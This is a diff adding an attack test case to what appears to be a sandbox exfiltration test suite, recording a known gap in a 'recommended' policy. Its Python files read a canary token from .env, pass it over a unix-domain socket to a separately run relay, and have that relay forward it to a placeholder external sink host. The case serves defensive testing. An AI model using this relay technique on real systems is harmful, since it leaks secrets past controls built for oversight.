@@ -1,0 +1,56 @@
+# KNOWN GAP: `recommended` does not forbid the `unix` peer class. Shell 1 (a
+# different, untainted principal) runs a relay on a unix-domain socket that
+# forwards to the external sink. Shell 0 reads the secret and writes it to the
+# unix socket -- an allowed peer -- and the relay carries it out. Registered in
+# known-gaps.toml.
+name = "proxy-via-unix"
+kind = "attack"
+policy = "recommended"
+# No shared `principal`: the relay is a separate principal from the reader.
+
+[[files]]
+path = ".env"
+contents = "TOKEN={CANARY}\n"
+
+[[files]]
+path = "relay.py"
+contents = """
+import os, socket
+path = "relay.sock"
+try:
+    os.unlink(path)
+except FileNotFoundError:
+    pass
+srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+srv.bind(path)
+srv.listen(1)
+conn, _ = srv.accept()
+data = conn.recv(65536)
+out = socket.socket()
+out.connect(("{SINK_HOST}", {SINK_PORT}))
+out.sendall(data)
+"""
+
+[[files]]
+path = "send.py"
+contents = """
+import socket, time
+secret = open(".env", "rb").read()
+time.sleep(0.5)
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.connect("relay.sock")
+s.sendall(secret)
+"""
+
+[[steps]]
+shell = 1
+run = "python3 relay.py &"
+expect = "accepted"
+
+[[steps]]
+shell = 0
+run = "python3 send.py"
+expect = "any"
+
+[oracle]
+encodings = ["raw", "base64", "hex"]
